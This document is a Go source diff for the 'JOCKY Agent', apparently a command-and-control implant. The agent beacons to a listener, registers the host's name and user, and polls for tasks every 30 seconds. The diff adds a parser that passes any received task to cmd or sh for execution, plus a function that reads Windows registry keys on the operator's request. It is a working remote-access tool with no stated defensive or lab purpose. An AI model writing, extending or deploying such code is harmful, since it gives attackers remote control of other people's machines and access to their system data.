@@ -9,7 +9,9 @@ import (
     "os"
     "os/exec"
     "runtime"
+    "strings"
     "time"
+    "golang.org/x/sys/windows/registry"
 )
 
 // ============================================================
@@ -33,9 +35,6 @@ func randomString(n int) string {
     return string(b)
 }
 
-// ============================================================
-// STRUCTS MATCHING MANAGER API
-// ============================================================
 type RegisterRequest struct {
     AgentID  string `json:"agent_id"`
     Hostname string `json:"hostname"`
@@ -66,13 +65,10 @@ func main() {
     fmt.Printf("[+] JOCKY Agent %s started\n", AgentID)
     fmt.Printf("[+] Beaconing to: %s\n", LISTENER_URL)
 
-    // Step 1: Register
     if err := registerAgent(hostname, username, osStr); err != nil {
         fmt.Printf("[!] Registration failed: %v\n", err)
-        // Continue anyway – heartbeat might fail if not registered
     }
 
-    // Step 2: Main loop – heartbeat
     for {
         task, err := sendHeartbeat()
         if err != nil {
@@ -83,17 +79,131 @@ func main() {
 
         if task != "" {
             fmt.Printf("[TASK] Received: %s\n", task)
-            result := executeTask(task)
+            result := executeJOCKY(task)
             fmt.Printf("[RESULT] %s\n", result)
-            // Optionally send result back? The manager doesn't have a result endpoint yet.
-            // You can add a /result endpoint if needed.
         }
 
         time.Sleep(30 * time.Second)
     }
 }
 
-// registerAgent calls the /register endpoint
+// ============================================================
+// JOCKY SCRIPT PARSER (IMPROVED)
+// ============================================================
+
+func executeJOCKY(script string) string {
+    script = strings.TrimSpace(script)
+
+    // If it's a plain command (no curly braces), run as shell
+    if !strings.Contains(script, "agent") && !strings.Contains(script, "{") {
+        return runShellCommand(script)
+    }
+
+    // Try to extract exec("...") or exec('...')
+    if strings.Contains(script, "exec(") {
+        start := strings.Index(script, "exec(")
+        if start != -1 {
+            start += 5 // len("exec(")
+            if start < len(script) && (script[start] == '"' || script[start] == '\'') {
+                quote := script[start]
+                end := strings.Index(script[start+1:], string(quote))
+                if end != -1 {
+                    cmd := script[start+1 : start+1+end]
+                    return runShellCommand(cmd)
+                }
+            }
+        }
+    }
+
+    // Try to extract collect_registry("...")
+    if strings.Contains(script, "collect_registry(") {
+        start := strings.Index(script, "collect_registry(")
+        if start != -1 {
+            start += len("collect_registry(")
+            if start < len(script) && (script[start] == '"' || script[start] == '\'') {
+                quote := script[start]
+                end := strings.Index(script[start+1:], string(quote))
+                if end != -1 {
+                    path := script[start+1 : start+1+end]
+                    // Replace double backslashes with single (they are escaped in the JSON)
+                    path = strings.ReplaceAll(path, "\\\\", "\\")
+                    return collectRegistry(path)
+                }
+            }
+        }
+    }
+
+    // Fallback: try to run the whole script as a command
+    return runShellCommand(script)
+}
+
+func runShellCommand(cmdStr string) string {
+    const errPrefix = "error: "
+    var cmd *exec.Cmd
+    if runtime.GOOS == "windows" {
+        cmd = exec.Command("cmd", "/c", cmdStr)
+    } else {
+        cmd = exec.Command("sh", "-c", cmdStr)
+    }
+    out, err := cmd.Output()
+    if err != nil {
+        return errPrefix + err.Error()
+    }
+    return string(out)
+}
+
+func collectRegistry(path string) string {
+    if runtime.GOOS != "windows" {
+        return "Registry access only supported on Windows"
+    }
+
+    parts := strings.SplitN(path, "\\", 2)
+    if len(parts) != 2 {
+        return "error: invalid registry path format"
+    }
+    hiveStr, keyPath := parts[0], parts[1]
+
+    var hive registry.Key
+    switch strings.ToUpper(hiveStr) {
+    case "HKLM":
+        hive = registry.LOCAL_MACHINE
+    case "HKCU":
+        hive = registry.CURRENT_USER
+    case "HKCR":
+        hive = registry.CLASSES_ROOT
+    case "HKU":
+        hive = registry.USERS
+    case "HKCC":
+        hive = registry.CURRENT_CONFIG
+    default:
+        return "error: unknown hive " + hiveStr
+    }
+
+    key, err := registry.OpenKey(hive, keyPath, registry.READ)
+    if err != nil {
+        return "error: " + err.Error()
+    }
+    defer key.Close()
+
+    valueNames, err := key.ReadValueNames(0)
+    if err != nil {
+        return "error: " + err.Error()
+    }
+
+    var result strings.Builder
+    for _, name := range valueNames {
+        val, _, err := key.GetStringValue(name)
+        if err != nil {
+            continue
+        }
+        result.WriteString(fmt.Sprintf("%s: %s\n", name, val))
+    }
+    return result.String()
+}
+
+// ============================================================
+// REGISTRATION AND HEARTBEAT (unchanged)
+// ============================================================
 func registerAgent(hostname, username, osStr string) error {
     reqBody := RegisterRequest{
         AgentID:  AgentID,
@@ -134,7 +244,6 @@ func registerAgent(hostname, username, osStr string) error {
     return nil
 }
 
-// sendHeartbeat sends a heartbeat and returns a deployment script (if any)
 func sendHeartbeat() (string, error) {
     reqBody := HeartbeatRequest{AgentID: AgentID}
     body, _ := json.Marshal(reqBody)
@@ -174,42 +283,7 @@ func sendHeartbeat() (string, error) {
     }
 
     if deploymentResp.Deployment != nil {
-        // Return the code to execute
         return deploymentResp.Deployment.Code, nil
     }
-
     return "", nil
-}
-
-// executeTask runs a command and returns the output.
-func executeTask(task string) string {
-    const errPrefix = "error: "
-    switch task {
-    case "whoami":
-        cmd := exec.Command("whoami")
-        out, err := cmd.Output()
-        if err != nil {
-            return errPrefix + err.Error()
-        }
-        return string(out)
-    case "hostname":
-        cmd := exec.Command("hostname")
-        out, err := cmd.Output()
-        if err != nil {
-            return errPrefix + err.Error()
-        }
-        return string(out)
-    default:
-        var cmd *exec.Cmd
-        if runtime.GOOS == "windows" {
-            cmd = exec.Command("cmd", "/c", task)
-        } else {
-            cmd = exec.Command("sh", "-c", task)
-        }
-        out, err := cmd.Output()
-        if err != nil {
-            return errPrefix + err.Error()
-        }
-        return string(out)
-    }
 }
